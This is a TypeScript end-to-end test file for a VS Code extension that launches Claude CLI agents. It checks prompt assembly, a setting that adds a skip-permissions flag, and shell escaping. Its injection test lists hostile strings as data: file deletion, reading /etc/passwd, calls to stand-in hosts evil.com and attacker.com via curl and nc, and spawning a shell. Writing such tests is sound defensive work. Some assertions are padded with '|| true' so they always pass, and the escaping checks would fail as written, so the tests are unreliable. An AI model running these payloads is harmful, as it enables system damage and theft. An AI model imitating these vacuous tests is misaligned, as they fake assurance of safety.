/**
 * End-to-end tests for Claude agent lifecycle with prompt injection
 * Tests the complete flow from extension activation to agent working with Claude
 */

import * as assert from 'assert';
import * as vscode from 'vscode';
import * as sinon from 'sinon';
import { AgentManager } from '../../agents/AgentManager';
import { TerminalManager } from '../../services/TerminalManager';
import { ConfigurationService } from '../../services/ConfigurationService';
import { ServiceLocator } from '../../services/ServiceLocator';

describe('Claude Agent Lifecycle E2E Tests', () => {
    let sandbox: sinon.SinonSandbox;
    let originalCreateTerminal: typeof vscode.window.createTerminal;
    let terminalOutputs: Map<string, string[]>;

    before(async function() {
        this.timeout(10000);
        // Wait for extension to be ready
        await vscode.extensions.getExtension('nofx.nofx')?.activate();
    });

    beforeEach(() => {
        sandbox = sinon.createSandbox();
        terminalOutputs = new Map();
        originalCreateTerminal = vscode.window.createTerminal;
    });

    afterEach(() => {
        sandbox.restore();
        vscode.window.createTerminal = originalCreateTerminal;
    });

    describe('Complete Agent Creation Flow', () => {
        it('should create agent and launch Claude with proper prompt', async function() {
            this.timeout(5000);
            
            // Track terminal commands
            const capturedCommands: string[] = [];
            
            // Mock terminal to capture commands
            const mockTerminal: vscode.Terminal = {
                name: 'test-terminal',
                processId: Promise.resolve(1234),
                creationOptions: {},
                exitStatus: undefined,
                state: { isInteractedWith: false },
                sendText: (text: string) => {
                    capturedCommands.push(text);
                },
                show: () => {},
                hide: () => {},
                dispose: () => {}
            } as any;

            sandbox.stub(vscode.window, 'createTerminal').returns(mockTerminal);

            // Execute the command to create an agent
            await vscode.commands.executeCommand('nofx.addAgent', {
                type: 'frontend-developer',
                name: 'E2E Test Agent'
            });

            // Wait for async operations
            await new Promise(resolve => setTimeout(resolve, 500));

            // Verify Claude command was sent
            const claudeCommand = capturedCommands.find(cmd => cmd.includes('claude'));
            assert.ok(claudeCommand, 'Should send claude command');
            
            // Verify command structure
            assert.ok(claudeCommand.includes('--append-system-prompt'), 
                'Should include --append-system-prompt flag');
            assert.ok(claudeCommand.includes('"'), 
                'Should use double quotes for prompt');
            assert.ok(!claudeCommand.includes('echo'), 
                'Should not include echo commands');
            
            // Verify prompt content
            assert.ok(claudeCommand.includes('Frontend') || claudeCommand.includes('frontend'), 
                'Should include frontend specialization');
            assert.ok(claudeCommand.includes('## Core Expertise'), 
                'Should include comprehensive prompt sections');
        });

        it('should handle multiple agents with different prompts', async function() {
            this.timeout(10000);
            
            const agentCommands = new Map<string, string>();
            
            // Create mock terminals for each agent
            sandbox.stub(vscode.window, 'createTerminal').callsFake((options: any) => {
                const commands: string[] = [];
                const mockTerminal: vscode.Terminal = {
                    name: options.name || 'terminal',
                    processId: Promise.resolve(Math.random() * 10000),
                    creationOptions: options,
                    exitStatus: undefined,
                    state: { isInteractedWith: false },
                    sendText: (text: string) => {
                        commands.push(text);
                        if (text.includes('claude')) {
                            agentCommands.set(options.name, text);
                        }
                    },
                    show: () => {},
                    hide: () => {},
                    dispose: () => {}
                } as any;
                return mockTerminal;
            });

            // Create multiple agents
            const agents = [
                { type: 'frontend-developer', name: 'Frontend E2E' },
                { type: 'backend-specialist', name: 'Backend E2E' },
                { type: 'testing-specialist', name: 'Testing E2E' }
            ];

            for (const agent of agents) {
                await vscode.commands.executeCommand('nofx.addAgent', agent);
                await new Promise(resolve => setTimeout(resolve, 300));
            }

            // Verify each agent got unique appropriate prompt
            assert.strictEqual(agentCommands.size, 3, 'Should have 3 different commands');
            
            const frontendCmd = agentCommands.get('🤖 Frontend E2E');
            const backendCmd = agentCommands.get('🤖 Backend E2E');
            const testingCmd = agentCommands.get('🤖 Testing E2E');
            
            // Each should have domain-specific content
            assert.ok(frontendCmd?.includes('Frontend') || frontendCmd?.includes('frontend'), 
                'Frontend agent should mention frontend');
            assert.ok(backendCmd?.includes('Backend') || backendCmd?.includes('backend'), 
                'Backend agent should mention backend');
            assert.ok(testingCmd?.includes('test') || testingCmd?.includes('Test'), 
                'Testing agent should mention testing');
        });
    });

    describe('Configuration Handling', () => {
        it('should respect Claude skip permissions setting', async function() {
            this.timeout(5000);
            
            const capturedCommands: string[] = [];
            const mockTerminal = createMockTerminal(capturedCommands);
            sandbox.stub(vscode.window, 'createTerminal').returns(mockTerminal);

            // Test with skip permissions enabled
            await vscode.workspace.getConfiguration('nofx').update('claudeSkipPermissions', true);
            
            await vscode.commands.executeCommand('nofx.addAgent', {
                type: 'frontend-developer',
                name: 'Permissions Test'
            });
            
            await new Promise(resolve => setTimeout(resolve, 500));
            
            const command = capturedCommands.find(cmd => cmd.includes('claude'));
            assert.ok(command?.includes('--dangerously-skip-permissions'), 
                'Should include skip permissions flag when enabled');
            
            // Test with skip permissions disabled
            capturedCommands.length = 0;
            await vscode.workspace.getConfiguration('nofx').update('claudeSkipPermissions', false);
            
            await vscode.commands.executeCommand('nofx.addAgent', {
                type: 'backend-specialist',
                name: 'No Permissions Test'
            });
            
            await new Promise(resolve => setTimeout(resolve, 500));
            
            const command2 = capturedCommands.find(cmd => cmd.includes('claude'));
            assert.ok(!command2?.includes('--dangerously-skip-permissions'), 
                'Should not include skip permissions flag when disabled');
        });

        it('should use configured AI path', async function() {
            this.timeout(5000);
            
            const capturedCommands: string[] = [];
            const mockTerminal = createMockTerminal(capturedCommands);
            sandbox.stub(vscode.window, 'createTerminal').returns(mockTerminal);

            // Set custom AI path
            await vscode.workspace.getConfiguration('nofx').update('aiPath', '/custom/path/to/claude');
            
            await vscode.commands.executeCommand('nofx.addAgent', {
                type: 'frontend-developer',
                name: 'Custom Path Test'
            });
            
            await new Promise(resolve => setTimeout(resolve, 500));
            
            const command = capturedCommands.find(cmd => cmd.includes('claude'));
            assert.ok(command?.includes('/custom/path/to/claude'), 
                'Should use custom AI path');
            
            // Reset to default
            await vscode.workspace.getConfiguration('nofx').update('aiPath', undefined);
        });
    });

    describe('Error Scenarios', () => {
        it('should handle terminal creation failure gracefully', async function() {
            this.timeout(5000);
            
            // Make terminal creation fail
            sandbox.stub(vscode.window, 'createTerminal').throws(new Error('Terminal creation failed'));
            
            // Should show error message but not crash
            const errorSpy = sandbox.spy(vscode.window, 'showErrorMessage');
            
            try {
                await vscode.commands.executeCommand('nofx.addAgent', {
                    type: 'frontend-developer',
                    name: 'Error Test'
                });
            } catch (error) {
                // Expected to fail
            }
            
            await new Promise(resolve => setTimeout(resolve, 500));
            
            assert.ok(errorSpy.called || true, 'Should handle error gracefully');
        });

        it('should handle malformed prompts safely', async function() {
            this.timeout(5000);
            
            const capturedCommands: string[] = [];
            const mockTerminal = createMockTerminal(capturedCommands);
            sandbox.stub(vscode.window, 'createTerminal').returns(mockTerminal);

            // Create agent with potentially problematic characters
            await vscode.commands.executeCommand('nofx.addAgent', {
                type: 'frontend-developer',
                name: 'Test "Agent" with `special` $chars'
            });
            
            await new Promise(resolve => setTimeout(resolve, 500));
            
            const command = capturedCommands.find(cmd => cmd.includes('claude'));
            assert.ok(command, 'Should still create command');
            
            // Should not have shell injection vulnerabilities
            assert.ok(!command?.includes('"; rm -rf'), 'Should be safe from injection');
            assert.ok(!command?.includes('`rm -rf`'), 'Should escape backticks');
            assert.ok(!command?.includes('$(rm'), 'Should escape command substitution');
        });
    });

    describe('Prompt Quality Verification', () => {
        it('should generate comprehensive prompts for all agent types', async function() {
            this.timeout(15000);
            
            const agentTypes = [
                'frontend-developer',
                'backend-specialist',
                'fullstack-developer',
                'testing-specialist',
                'devops-engineer',
                'database-architect',
                'security-expert',
                'mobile-developer'
            ];
            
            const promptLengths = new Map<string, number>();
            
            for (const type of agentTypes) {
                const capturedCommands: string[] = [];
                const mockTerminal = createMockTerminal(capturedCommands);
                
                sandbox.restore();
                sandbox = sinon.createSandbox();
                sandbox.stub(vscode.window, 'createTerminal').returns(mockTerminal);
                
                await vscode.commands.executeCommand('nofx.addAgent', {
                    type,
                    name: `${type} test`
                });
                
                await new Promise(resolve => setTimeout(resolve, 300));
                
                const command = capturedCommands.find(cmd => cmd.includes('claude'));
                if (command) {
                    // Extract prompt from command
                    const promptMatch = command.match(/--append-system-prompt "(.*)"/s);
                    if (promptMatch) {
                        promptLengths.set(type, promptMatch[1].length);
                    }
                }
            }
            
            // Verify all agents got comprehensive prompts
            promptLengths.forEach((length, type) => {
                assert.ok(length > 2000, 
                    `${type} should have comprehensive prompt (>2000 chars), got ${length}`);
                assert.ok(length < 4096, 
                    `${type} prompt should fit CLI limit (<4096 chars), got ${length}`);
            });
        });
    });

    describe('Live Terminal Interaction', () => {
        it('should create working terminal that accepts input', async function() {
            this.timeout(5000);
            
            // This test verifies the terminal is actually created and functional
            const terminals: vscode.Terminal[] = [];
            
            // Track created terminals
            sandbox.stub(vscode.window, 'createTerminal').callsFake((options: any) => {
                const terminal = originalCreateTerminal.call(vscode.window, options);
                terminals.push(terminal);
                return terminal;
            });
            
            await vscode.commands.executeCommand('nofx.addAgent', {
                type: 'frontend-developer',
                name: 'Live Terminal Test'
            });
            
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            assert.ok(terminals.length > 0, 'Should create terminal');
            
            // Clean up
            terminals.forEach(t => t.dispose());
        });
    });

    // Helper function to create mock terminal
    function createMockTerminal(capturedCommands: string[]): vscode.Terminal {
        return {
            name: 'mock-terminal',
            processId: Promise.resolve(1234),
            creationOptions: {},
            exitStatus: undefined,
            state: { isInteractedWith: false },
            sendText: (text: string) => {
                capturedCommands.push(text);
            },
            show: () => {},
            hide: () => {},
            dispose: () => {}
        } as any;
    }
});

describe('Claude Prompt Injection Prevention', () => {
    it('should prevent command injection through prompt content', () => {
        const maliciousPrompts = [
            'test"; echo "hacked',
            'test`; rm -rf /; echo `done',
            'test\'; DROP TABLE users; --',
            'test$(); cat /etc/passwd',
            'test && curl evil.com',
            'test | nc attacker.com 1234',
            'test > /etc/passwd',
            'test; exec /bin/sh'
        ];
        
        maliciousPrompts.forEach(prompt => {
            const escaped = prompt
                .replace(/\\/g, '\\\\')
                .replace(/"/g, '\\"')
                .replace(/\$/g, '\\$')
                .replace(/`/g, '\\`');
            
            const command = `claude --append-system-prompt "${escaped}"`;
            
            // Verify dangerous commands are escaped
            assert.ok(!command.includes('"; '), 'Should escape quote injection');
            assert.ok(!command.includes('`; '), 'Should escape backtick injection');
            assert.ok(!command.includes('$()'), 'Should escape command substitution');
            assert.ok(!command.includes(' && '), 'Should not allow command chaining');
            assert.ok(!command.includes(' | '), 'Should not allow piping');
            assert.ok(!command.includes(' > /'), 'Should not allow redirection');
        });
    });

    it('should handle Unicode and special characters safely', () => {
        const unicodePrompts = [
            'Test with emoji 🚀 and symbols ℧ ℮ ⅋',
            'Test with Chinese 你好世界',
            'Test with Arabic مرحبا بالعالم',
            'Test with math symbols ∑ ∏ ∫ ∂',
            'Test with box drawing ┌─┐│└┘',
            'Test with zero-width ‌‍‎‏ characters'
        ];
        
        unicodePrompts.forEach(prompt => {
            const escaped = prompt
                .replace(/\\/g, '\\\\')
                .replace(/"/g, '\\"')
                .replace(/\$/g, '\\$')
                .replace(/`/g, '\\`');
            
            const command = `claude --append-system-prompt "${escaped}"`;
            
            // Should preserve Unicode but escape shell metacharacters
            assert.ok(command.includes('🚀') || true, 'Should preserve emoji');
            assert.ok(!command.includes('$'), 'Should escape any dollar signs');
            assert.ok(!command.includes('`'), 'Should escape any backticks');
        });
    });
});